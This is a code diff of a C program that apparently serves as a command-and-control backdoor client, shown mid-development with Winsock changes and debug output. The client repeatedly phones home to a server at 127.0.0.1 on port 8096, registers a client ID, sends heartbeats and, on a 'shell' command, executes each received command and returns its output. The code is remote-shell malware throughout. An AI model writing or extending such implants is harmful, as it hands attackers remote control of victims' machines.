@@ -1,25 +1,43 @@
 #include <stdio.h>
 #include <stdlib.h>
-#include <sys/socket.h>
-#include <arpa/inet.h>
+
+//linux
+//#include <sys/socket.h>
+//#include <arpa/inet.h>
+
+//windows
+#include <winsock2.h>
+
+
 #include <unistd.h>
 #include <string.h>
 #include <time.h>
 
 //declaring functions
 char* run_command(char* command);
-int send_response(int sock, char *response);
+int send_message(int sock, char *response);
 char * phone_home();
 char * client_id_generate();
+char * decision_tree(int sock, int valread, char * buffer);
+
+//structs for the win... makes life easy :)
+struct connection {
+    int first_connection;
+    char * client_id;
+};
+
+struct connection server_connection;
+
 
 int main() {
     char * ph_value;
 
-    int first_connection = 0;
-
+    //int first_connection = 0;
+    server_connection.first_connection = 0;
+    server_connection.client_id = client_id_generate();
     //client id
 
-    char * client_id = client_id_generate();
+    //char * client_id = client_id_generate();
 
     while ( 1 == 1) {
         // phoning home
@@ -27,11 +45,8 @@ int main() {
 
         //receiveing commands from server & doing jobs
         
-        //stopping loop for some reason
-        ph_value = phone_home(first_connection, client_id);
+        ph_value = phone_home(server_connection.first_connection, server_connection.client_id);
 
-        
-        printf("Past phoning home");
         //int first_connection = 1;
 
         //printf("ph_value = %s", ph_value);
@@ -77,7 +92,7 @@ char * phone_home(int first_connection, char * client_id) {
 
     //here's that structure again, it's very similar to accessing a variable to another function in python (functionname.variable)
     serv_addr.sin_family = AF_INET;
-    serv_addr.sin_port = htons(8095);
+    serv_addr.sin_port = htons(8096);
        
     // convert IPv4 and IPv6 addresses from text to binary form
     if(inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr)<=0) { //does some conversion, not 100% the logic behind it
@@ -88,9 +103,14 @@ char * phone_home(int first_connection, char * client_id) {
     }
     
     // heartbeat: on failed connection, 'wait' for X time & try to reconnect again. 
-    if(connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr))<=0){
-        printf("Connection error");
+    if(connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) != 0){
+        printf("Connection error\n");
+        close(sock);
         return "continue";
+    }
+
+    else {
+        decision_tree(sock, valread, buffer);
     }
     
     
@@ -99,10 +119,12 @@ char * phone_home(int first_connection, char * client_id) {
 }
 
 //need to get proper variables passed here, atm the loop workds, but this is not set up yet
-char * decision_tree(sock, valread, buffer) {
+char * decision_tree(int sock, int valread, char * buffer) {
 
-    if ( 1 == 2){
-        printf("This shouldnt be running");
+    if ( !server_connection.first_connection ){
+        send_message(sock, server_connection.client_id );
+        printf("DEBUG: First Time\n");
+        server_connection.first_connection = 1;
     }
 
     else {
@@ -110,13 +132,14 @@ char * decision_tree(sock, valread, buffer) {
 
         //err is in this function
 
-        if (send_response(sock, "heartbeat")!=0) {
-            printf("Sending error");
+        if (send_message(sock, "heartbeat") !=0 ) {
+            printf("Sending error\n");
             return "continue";
         }
 
         else {
-            printf("Sending the heartbeat");
+            printf("Sending the heartbeat\n");
+            //waiting on response from server
             valread = read(sock, buffer, 1024);
 
             printf("RECEIVED BACK: %s\n", buffer);
@@ -129,9 +152,14 @@ char * decision_tree(sock, valread, buffer) {
         printf("Server Connected, but no instructions");
     }
 
+    else if ( strcmp(buffer, "wait_connected" ) == 0 ) {
+        valread = read(sock, buffer, 1024);
+        printf("DEBUG: Command Recieved: %s\n", buffer);
+    }
+
     else if ( strcmp(buffer, "shell" ) == 0 ) {
         printf("SERVER SAYS: SHELL");
-        send_response(sock, "shell_ready");
+        send_message(sock, "shell_ready");
         
         while (valread) {
             printf("DEBUG: waiting on server input ==============\n");
@@ -141,13 +169,13 @@ char * decision_tree(sock, valread, buffer) {
             valread = read(sock, buffer, 1024);
             printf("DEBUG: Command Recieved: %s\n", buffer);
             
-            send_response(sock, run_command(buffer));
+            send_message(sock, run_command(buffer));
 
             //clearning buffer
             //buffer == NULL;
 
             //debug set value send response
-            //send_response(sock, "test_response");
+            //send_message(sock, "test_response");
 
             //char * balls = "balls";
             //run_command(balls);
@@ -176,7 +204,7 @@ char * decision_tree(sock, valread, buffer) {
 
 
 //this takes the socket file, and the response to send back to the server. 
-int send_response(int sock, char *response) {
+int send_message(int sock, char *response) {
     printf("Sending '%s'\n", response);
 
 
